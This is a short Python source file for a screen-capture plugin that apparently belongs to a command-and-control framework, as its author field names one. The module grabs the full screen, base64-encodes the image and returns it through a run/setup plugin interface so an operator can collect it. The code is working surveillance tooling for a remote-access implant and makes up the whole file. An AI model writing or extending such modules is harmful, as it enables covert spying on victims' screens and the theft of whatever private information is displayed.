#!/usr/bin/env python3
import os
import base64
from io import BytesIO
from datetime import datetime
from PIL import ImageGrab

class Screenshot:
    def __init__(self):
        self.name = "screenshot"
        self.description = "Capture screen contents"
        self.author = "Your C2 Framework"

    def take_screenshot(self):
        """
        Capture the screen and return it as a base64 encoded string
        """
        try:
            # Capture the screen
            screenshot = ImageGrab.grab()
            
            # Save to bytes
            img_bytes = BytesIO()
            screenshot.save(img_bytes, format='PNG')
            img_bytes = img_bytes.getvalue()
            
            # Encode to base64
            img_b64 = base64.b64encode(img_bytes).decode()
            
            return {
                "status": "success",
                "timestamp": datetime.now().isoformat(),
                "data": img_b64,
                "format": "png",
                "encoding": "base64"
            }
            
        except Exception as e:
            return {
                "status": "error",
                "error": str(e),
                "timestamp": datetime.now().isoformat()
            }

    def run(self, **kwargs):
        """
        Main execution method
        """
        return self.take_screenshot()

def setup():
    """
    Module initialization
    """
    return Screenshot() 